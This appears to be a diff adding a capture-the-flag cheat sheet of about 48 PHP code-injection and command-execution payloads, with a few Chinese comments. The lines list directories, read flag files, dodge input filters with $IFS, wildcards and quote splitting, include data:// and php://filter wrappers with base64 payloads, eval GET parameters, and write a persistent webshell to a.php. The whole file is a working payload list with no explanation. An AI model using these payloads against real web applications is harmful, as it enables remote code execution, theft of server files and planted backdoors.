@@ -1,0 +1,48 @@
+$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");} x
+$d=opendir(".");while(false!==($f=readdir($d))){echo"$f\n";}
+$d=dir(".");while(false!==($f=$d->read())){echo$f."\n";}
+print_r(glob("*")); 
+print_r(glob("/*"));
+scandir('.');
+scandir(current(localeconv()));
+scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))));
+print_r(next(array_reverse(scandir(pos(localeconv())))));
+print_r(array_rand(array_flip(scandir(pos(localeconv())))));
+system(end(next(get_defined_vars())));
+print_r(scandir(dirname('__FILE__')));
+system("ls");
+var_export(scandir('/'));
+var_dump(glob('/*'));
+system($_GET['a']);&a=cat flag.php;
+echo `cat fl''ag.php`;
+highlight_file(next(array_reverse(scandir("."))));
+eval(end(current(get_defined_vars())));&a=system("cat flag.php");
+passthru('cat /flag_is_her3');
+a=g;cat$IFS$1fla$a.php
+system("cat fl*g.php");
+system("tac fl*g.php");
+print_r(file('flag.php'));
+var_dump(file('flag.php'));
+exec(%27cat%20/flag_is_her3%27,$array);var_dump($array);
+readfile("flag.php"); 
+$a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;} x
+$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}  x
+$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);var_dump($line);} x
+system("cp fl*g.php a.txt "); //访问/a.txt
+data://text/plain,<?=system('tac%20f*');?>  x
+include$_GET[a]?>&a=data://text/plain,<?php system('ls /');?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/Pg== x 
+include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
+/bin/ca?${IFS}f??????? x
+/???/????64%20????.??? x
+/???/???/????2 ???????? x
+$a=fopen("flag.php","r");while($b=fgets($a)){echo $b;} x
+system('echo -e " <?php \n error_reporting(0); \n  \$c= \$_GET[\'c\']; \n eval(\$c); " > a.php');  //访问/a.php?c=system("tac flag.php"); x
+system("cat fl*g.php | grep  -E 'fl.g' ");
+include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
+include('flag.php');echo $flag;
+include('/flag.txt');var_export(get_defined_vars());
+include('flag.php');var_dump(get_defined_vars());	
+include("/flag.txt");$ss=ob_get_contents();ob_end_clean();echo $ss;
+include('/flag.txt');var_export(get_defined_vars());exit();
+include('/flag.txt');var_export(get_defined_vars());die();
